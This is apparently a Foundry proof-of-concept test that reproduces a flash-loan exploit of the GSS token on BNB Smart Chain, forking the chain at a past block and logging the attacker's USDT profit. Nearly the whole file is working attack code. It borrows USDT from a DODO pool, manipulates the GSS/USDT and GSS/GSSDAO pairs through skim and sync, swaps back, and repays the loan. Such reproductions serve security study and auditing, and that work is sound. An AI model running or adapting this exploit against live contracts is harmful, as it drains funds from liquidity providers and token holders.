// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {

    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public gss = 0x37e42B961AE37883BAc2fC29207A5F88eFa5db66;
    address public gss_usdt_pool = 0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0;
    address public gss_gssdao_pool = 0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64;
    address public pancakeRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public dodo_pool = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    function setUp() public {
        vm.createSelectFork("bsc", 31108559 - 1);
        vm.label(usdt, "USDT");
        vm.label(gss, "GSS");
        vm.label(gss_usdt_pool, "GSS_USDT_POOL");
        vm.label(gss_gssdao_pool, "GSS_GSSDAO_POOL");
        vm.label(pancakeRouterV2, "PANCAKE_ROUTER_V2");
        vm.label(dodo_pool, "DODOPool");
    }

    function testExploit() public {
        IDPPOracle(dodo_pool).flashLoan(0, 30000 ether, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        swap(usdt, gss, 30000 ether);
        IERC20(gss).transfer(gss_usdt_pool, 707162351662098288993328);

        IPancakePair(gss_usdt_pool).skim(gss_gssdao_pool);
        IPancakePair(gss_usdt_pool).sync();
        IPancakePair(gss_gssdao_pool).skim(address(this));

        swap(gss, usdt, IERC20(gss).balanceOf(address(this)));

        // pay back
        IERC20(usdt).transfer(msg.sender, 30000 ether);
        emit log_named_decimal_uint("Attacker USDT balance after exploit", IERC20(usdt).balanceOf(address(this)), 18);
    }

    function swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        IERC20(tokenIn).approve(pancakeRouterV2, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(payable(pancakeRouterV2)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp + 1000);
    }
}